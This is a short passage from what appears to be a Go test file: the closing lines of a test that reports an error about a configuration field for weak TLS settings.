		t.Errorf("weak tls: %v", conf.WeakTLS)
	}
}
